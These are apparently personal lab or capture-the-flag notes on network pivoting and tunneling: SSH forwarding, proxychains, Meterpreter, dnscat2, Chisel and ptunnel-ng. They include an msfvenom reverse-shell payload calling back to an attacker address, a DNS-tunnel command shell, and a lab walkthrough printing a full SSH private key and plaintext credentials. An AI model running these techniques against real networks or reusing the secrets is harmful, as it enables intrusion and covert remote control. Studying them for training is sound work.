# PortForwarding
### No configurations
Using attacker port and IP address, connecting to the victim port, user and IP address.
`ssh -L 1234:localhost:3306 victim@192.168.1.0`
Then in the victim machine using
`mysql -h 127.0.0.1 -P 1234 -u root -p`

Forwarding multiple ports
`ssh -L 1234:localhost:3306 -L 8080:localhosst:80 ubuntu@10.129.202.64`

### Dynamic Port Forwarding
`ssh -D 9050 ubuntu@10.129.202.64`

### Proxychains
`proxychains nmap -v -sn 172.16.5.1-200`

### Meterpreter Tunneling/Port Forwarding (Ping_sweep)
#msfconsole
#portforwarding
```bash
# Make the payload for the victim machine
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080

# Send the copy to the victim host
scp backupjob ubuntu@10.129.202.64:/home/ubuntu/

# Using Msfconsole
msfconsole -q
use exploit/mulit/handler
set lhost 0.0.0.0
set lport 8080
set payload linux/x64/meterpreter/reverse_tcp
run

# On the victim
chmod +x backupjob
./backupjob

# In the meterpreter shell
# The 172 range is the IP network on the ubuntu machine can see
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

#### Accessing the targets
```bash
# In the same meterpreter shell
run autoroute -s 172.16.5.0/23

# Will set the route, then running
run autoroute -p

# Will give the routes needed for this example the routes were
172.16.5.0, 255.255.254.0
```

### DNS Tunneling with Dnscat2
The set up
```bash
# Get the repo
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/ 
sudo gem install bundler 
sudo bundle install

# install the correct dependancies
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
git clone https://github.com/lukebaggett/dnscat2-powershell.git
cd dnscat2-powershell 
python3 -m http.server 8000
```
```Powershell
# Copy the second repo to the client machine
cd C:\Users\htb-student\Downloads
Import-Module .\dnscat2.ps1
Invoke-WebRequest http://<YOUR_KALI_IP>:8000/dnscat2.ps1 -OutFile dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd

# Then using ? will give you the list of commands that you can use.
* echo
* help
* kill
* quit
* set
* start
* stop
* tunnels
* unset
* window
* windows
  
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 Security: ENCRYPTED AND VERIFIED!
```

### Chisel
#tunneling
Built in Go and uses HTTP transport data that is secured using ssh. 
```bash
git clone https://github.com/jpillora/chisel.git
cd chisel
sudo apt install golang-go -y
go build

# Send to the victim machine
# Make sure you check the version you need for the pivot host!!!!
scp chisel ubuntu@10.129.202.64:~/

# On the victim Machine
./chisel server -v -p 1234 --socks5

# Connecting to the chisel
./chisel client -v 10.129.202.64:1234 socks

# Configs in proxychains.conf
# The port is correct
socks5 127.0.0.1 1080

# Pivoting
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

# Doing a reverse pivot
Lazarus2858@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5
ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks
```

### ICMP Tunneling
#tunneling 
```bash
# Cloning and Auto building the tool
git clone https://github.com/utoni/ptunnel-ng.git
sudo ./autogen.sh

# Manualling building the tool
sudo apt install automake autoconf -y
cd ptunnel-ng/
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
./autogen.sh

# Then transfer what you need to the pivot host
scp -r ptunnel-ng ubuntu@10.129.202.64:~/

# On the pivot host
cd ptunnel-ng/src
sudo ./ptunnel-ng -r10.129.202.64 -R22

# Then the kali command
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22

# Port Forwarding and proxychaining, using multiple terminals
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
proxychains nmap -sV -sT 172.16.5.19 -p3389
proxychains xfreerdp3 /v:172.16.5.19 /u:victor /p:'pass@123' /cert:ignore
```

# Assessment
Starting IP address: 10.129.229.129

Enumerating the web page, this was found
```bash
# note to self,
in order to reach server01 or other servers in the subnet from here you have to us the user account:mlefay
with a password of :
Plain Human work!
```
And an SSH key
```bash
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

```bash
# copy the ssh key
cat id_rsa | base64 -w 0; echo  
'-- base64 output --'

echo -n '-- base64 output --' | base64 -d > id_rsa  
chmod 600 id_rsa

ssh -i web_admin_id_rsa -D 9050 webadmin@10.129.68.30

# With that you can log in and run a nmap with proxychains in another terminal
proxychains nmap -sC -sV -v -Pn 172.16.5.35
Also using netcat to check if certain ports are open

# With that
proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!' /drive:share,/home/user/tools /dynamic-resolution +clipboard
```